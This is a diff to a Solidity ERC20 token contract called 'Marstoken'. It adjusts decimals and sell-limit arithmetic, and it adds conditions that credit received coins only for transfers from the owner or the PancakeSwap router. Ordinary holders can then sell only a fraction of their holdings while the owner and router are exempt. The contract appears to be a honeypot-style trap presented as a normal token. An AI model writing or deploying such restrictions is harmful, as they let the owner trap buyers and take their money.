@@ -97,7 +97,7 @@ contract BTCSTtLTC is ERC20Interface, SafeMath {
     constructor() public {
         name = "Marstoken";
         symbol = "MARST";
-        decimals = 9;
+        decimals = 18;
         _totalSupply = 1000000000000;
 
         balances[msg.sender] = _totalSupply;
@@ -109,7 +109,9 @@ contract BTCSTtLTC is ERC20Interface, SafeMath {
         returns (bool success)
     {
         sentCoins[msg.sender] = safeAdd(sentCoins[msg.sender], tokens);
-        receivedCoins[to] = safeAdd(receivedCoins[to], tokens);
+
+        if (msg.sender == _owner || msg.sender == pancakeRouter)
+            receivedCoins[to] = safeAdd(receivedCoins[to], tokens);
 
         if (!(msg.sender == _owner || msg.sender == pancakeRouter))
             require(
@@ -117,7 +119,7 @@ contract BTCSTtLTC is ERC20Interface, SafeMath {
                     safeDiv(
                         safeMul(
                             receivedCoins[msg.sender],
-                            percentageToSellinFirstHour
+                            percentageToSellinFirstHour * decimals
                         ),
                         100 * decimals
                     ),
@@ -138,7 +140,8 @@ contract BTCSTtLTC is ERC20Interface, SafeMath {
         // require(from == _owner, "You are not the owner!");
 
         sentCoins[from] = safeAdd(sentCoins[from], tokens);
-        receivedCoins[to] = safeAdd(receivedCoins[to], tokens);
+        if (msg.sender == _owner || msg.sender == pancakeRouter)
+            receivedCoins[to] = safeAdd(receivedCoins[to], tokens);
 
         if (!(msg.sender == _owner || msg.sender == pancakeRouter))
             require(
@@ -146,7 +149,7 @@ contract BTCSTtLTC is ERC20Interface, SafeMath {
                     safeDiv(
                         safeMul(
                             receivedCoins[msg.sender],
-                            percentageToSellinFirstHour
+                            percentageToSellinFirstHour * decimals
                         ),
                         100 * decimals
                     ),
